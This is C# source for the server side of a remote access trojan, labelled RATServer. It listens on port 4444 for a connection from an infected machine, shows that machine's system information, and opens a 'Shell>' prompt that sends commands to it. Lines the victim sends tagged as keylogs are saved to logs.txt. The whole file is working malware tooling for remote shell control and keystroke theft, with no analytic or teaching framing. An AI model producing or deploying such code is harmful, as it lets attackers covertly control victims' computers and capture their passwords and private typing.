using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

class RATServer
{
    static void Main()
    {
        int listenPort = 4444;
        TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
        listener.Start();
        Console.WriteLine("[+] Listening for incoming connections on port " + listenPort);
        
        using (TcpClient client = listener.AcceptTcpClient())
        using (NetworkStream stream = client.GetStream())
        using (StreamReader reader = new StreamReader(stream))
        using (StreamWriter writer = new StreamWriter(stream))
        using (StreamWriter logWriter = new StreamWriter("logs.txt", true))
        {
            writer.AutoFlush = true;
            logWriter.AutoFlush = true;
            Console.WriteLine("[+] Connection established with " + client.Client.RemoteEndPoint);
            Console.WriteLine("[SYSTEM INFO]");
            
            string line;
            while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
            {
                Console.WriteLine(line);
            }
            
            Thread receiveThread = new Thread(() => ReceiveData(reader, logWriter));
            receiveThread.Start();
            
            while (true)
            {
                Console.Write("Shell> ");
                string command = Console.ReadLine();
                if (command.ToLower() == "exit") break;

                writer.WriteLine(command);
            }
        }
        
        listener.Stop();
    }
    
    static void ReceiveData(StreamReader reader, StreamWriter logWriter)
    {
        try
        {
            string line;
            while ((line = reader.ReadLine()) != null)
            {
                if (line.StartsWith("[KEYLOG]"))
                {
                    string logEntry = line.Replace("[KEYLOG] ", "");
                    logWriter.WriteLine(logEntry); 
                    Console.WriteLine("Keylog: " + logEntry);
                }
                else
                {
                    Console.WriteLine(line); 
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[ERROR] " + ex.Message);
        }
    }
}
